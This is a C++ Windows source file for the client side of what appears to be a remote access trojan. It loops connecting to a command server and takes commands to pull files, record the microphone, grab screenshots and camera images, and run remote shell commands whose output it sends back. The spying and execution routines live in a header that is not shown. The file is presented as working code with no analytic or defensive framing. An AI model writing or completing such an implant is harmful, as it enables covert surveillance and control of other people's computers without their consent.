#include "Header.h"

int main(int argc, char* argv[]) {
	WSADATA wsaData;
	SOCKET connectSocket = INVALID_SOCKET;
	addrinfo* result = NULL;
	addrinfo* ptr = NULL;

	int iResult;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("[ERROR] WSAStartup %d\n", iResult);
		return 1;
	}

	while (1) {
		waitAndConnect(&connectSocket);
		char* input = NULL;

		while (1) {
			DWORD inputSize = 0;

			iResult = recv(connectSocket, (char*)&inputSize, sizeof(inputSize), 0);
			if (iResult < 0) {
				printf("[ERROR] WSAStartup %d\n", WSAGetLastError());
				closesocket(connectSocket);
				WSACleanup();
				return 1;
			}

			input = (char*)calloc(inputSize + 1, sizeof(char));

			if (input) {
				iResult = recv(connectSocket, input, inputSize, 0);
				if (iResult > 0) {
					printf("[NOTICE] Received command: %s\n", input);
					BOOL isOption = FALSE;
					string command = "";
					string option = "";

					for (int i = 0; i < strlen(input); i++) {
						if (isOption) {
							option.push_back(input[i]);
						}
						else {
							if (input[i] == ' ') {
								isOption = TRUE;
								continue;
							}
							command.push_back(input[i]);
						}
					}


					if (command.compare("Quit") == 0) {
						free(input);
						goto ClientShutdown;
					}

					if (command.compare("Download") == 0) {
						receiveFile(option.c_str(), connectSocket);
					}

					if (command.compare("Mic") == 0) {
						Micro(atoi(option.c_str()), connectSocket);
					}

					if (command.compare("Screenshot") == 0) {
						Screenshot(connectSocket);
					}

					if (command.compare("Camera") == 0) {
						Camera(connectSocket);
					}

					if (command.compare("Remote") == 0) {
						doCommandAndSend(option.c_str(), connectSocket);
					}

				}
				else if (iResult < 0) {
					printf("[ERROR] recv. %d\n", WSAGetLastError());
					free(input);
					goto ServerDisconnected;
				}

				free(input);
			}
		}
		ServerDisconnected: {}
	}


	ClientShutdown:
	// shutdown the connection since no more data will be sent
	iResult = shutdown(connectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("[ERROR] shutdown socket. %d\n", WSAGetLastError());
		closesocket(connectSocket);
		WSACleanup();
		return 1;
	}

	// cleanup
	closesocket(connectSocket);
	WSACleanup();
	return 0;
}

// wait for server socket and connect
void waitAndConnect(SOCKET* connectSocket) {
	int iResult = 0;
	addrinfo* result = NULL, * ptr = NULL;
	addrinfo hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	while (1) {
		iResult = getaddrinfo(NULL, PORT, &hints, &result);
		if (iResult != 0) {
			printf("[ERROR] getaddrinfo. %d\n", iResult);
			return;
		}

		ptr = result;
		while (ptr) {
			*connectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
			if (*connectSocket == INVALID_SOCKET) {
				printf("[ERROR] socket. %d\n", WSAGetLastError());
				return;
			}

			iResult = connect(*connectSocket, ptr->ai_addr, ptr->ai_addrlen);
			if (iResult == SOCKET_ERROR) {
				*connectSocket = INVALID_SOCKET;
				ptr = ptr->ai_next;
				continue;
			}
			break;
		}

		freeaddrinfo(result);

		if (*connectSocket == INVALID_SOCKET) {
			printf("Waiting for connection...\n");
			continue;
		}

		printf("Connected to server with port %s\n", PORT);
		break;
	}
}